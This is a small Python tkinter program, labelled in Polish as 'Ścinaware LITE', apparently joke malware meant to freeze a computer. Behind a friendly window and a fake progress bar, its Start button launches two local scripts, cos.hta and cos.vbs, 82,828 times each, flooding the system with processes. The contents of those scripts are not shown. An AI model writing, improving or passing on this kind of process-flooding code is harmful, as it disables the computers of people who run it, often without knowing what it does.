import tkinter as tk
from tkinter import messagebox
from tkinter import ttk
import webbrowser
import os
import time


def otworz_github():
    webbrowser.open("https://github.com/1ex7ir")

def uruchom_skrypty():
    okno = tk.Toplevel()
    okno.title("Ścinaware LITE")
    okno.geometry("300x100")
    okno.resizable(False, False)
    folder = os.path.dirname(os.path.abspath(__file__))  
    ikona = os.path.join(folder, "icon.ico")

    okno.iconbitmap(ikona)

    etykieta = tk.Label(okno, text="Ścinaware pracuje!", font=("Arial", 12))
    etykieta.pack(pady=10)

    pasek = ttk.Progressbar(okno, orient="horizontal", length=250, mode="determinate", maximum=100)
    pasek.pack(pady=5)

    def ladowanie(i=0):
        if i > 100:
            i = 0
        pasek['value'] = i
        okno.after(45, lambda: ladowanie(i + 1))

    ladowanie()
    
    folder = os.path.dirname(os.path.abspath(__file__))
    hta = os.path.join(folder, "cos.hta")
    vbs = os.path.join(folder, "cos.vbs")
    
    for _ in range(82828):
        if os.path.exists(hta):
            os.startfile(hta)
        else:
            print("nie znaleziono pliku:", hta)
        if os.path.exists(vbs):
            os.startfile(vbs)
        else:
            print("nie znaleziono pliku:", vbs)
    
  
    


okno = tk.Tk()
okno.title("Ścinaware LITE")
okno.geometry("380x180")
okno.resizable(False, False)
folder = os.path.dirname(os.path.abspath(__file__))  
ikona = os.path.join(folder, "icon.ico")

okno.iconbitmap(ikona)


ramka = tk.Frame(okno)
ramka.pack(pady=10)


tk.Label(ramka, text="Ścinaware LITE", font=("Comic Sans MS", 17, "italic", "underline"), fg="orange").pack(side="left")

ramka_przyciski = tk.Frame(okno)
ramka_przyciski.pack(pady=10)

tk.Button(ramka_przyciski, text="Start", command=uruchom_skrypty, font=("Comic Sans MS", 13)).pack(side="left", padx=5)


ramka_dol = tk.Frame(okno)
ramka_dol.pack(pady=5)

tk.Label(ramka_dol, text="Wbij na:", font=("Comic Sans MS", 7)).pack(side="left", padx=5)
tk.Button(ramka_dol, text="GitHub", command=otworz_github, fg="orange", font=("Comic Sans MS", 8)).pack(side="left")

ramka_opis = tk.Frame(okno)
ramka_opis.pack(side="bottom", pady=5)

tk.Label(ramka_opis, text="Ścinaware LITE - minimalistyczna wersja Ścinaware.", font=("Comic Sans MS", 8)).pack()


# Start głównej pętli
okno.mainloop()
